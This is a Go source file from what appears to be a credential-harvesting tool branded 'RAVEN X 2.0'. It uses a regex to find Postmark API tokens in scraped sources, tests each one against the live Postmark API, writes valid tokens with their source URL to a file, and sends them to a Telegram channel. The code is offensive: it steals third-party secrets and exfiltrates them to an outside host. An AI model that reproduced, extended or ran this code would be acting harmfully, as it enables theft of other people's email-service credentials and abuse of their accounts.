package main

import (
	"fmt"
	"net/http"
	"regexp"
)

// Postmark server tokens are 36-char UUIDs (Postmark uses RFC4122 v4 format).
// Account tokens follow the same shape. The X-Postmark-Server-Token header
// validates against /server endpoint; a 200 confirms the key.
// Covers POSTMARK_SERVER_TOKEN, POSTMARK_API_TOKEN, PM_SERVER_TOKEN and bare postmark context.
var postmarkPattern = regexp.MustCompile(`(?i)(?:postmark[_\-]?(?:server[_\-]?|api[_\-]?)?token|POSTMARK_(?:SERVER_|API_)?TOKEN|PM_SERVER_TOKEN)["'\s:=]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`)

// CheckPostmark validates a Postmark server token by hitting GET /server
// with the X-Postmark-Server-Token header. Returns true on 200 (token is
// valid and active). 401/422 → false. Other statuses → false (treat as
// not-confirmed rather than risk a false positive).
func (a *AWSScanner) CheckPostmark(key, sourceURL string) bool {
	if !a.Config.APIValidation.Postmark {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, err := http.NewRequest("GET", "https://api.postmarkapp.com/server", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("X-Postmark-Server-Token", key)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		a.logValid("Postmark", fmt.Sprintf("Token: %s", key))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_postmark.txt")
		a.storeValidKeyLimit("Postmark", key, "Active")

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📮 <b>POSTMARK LIVE TOKEN</b>

🔑 <b>Token:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}
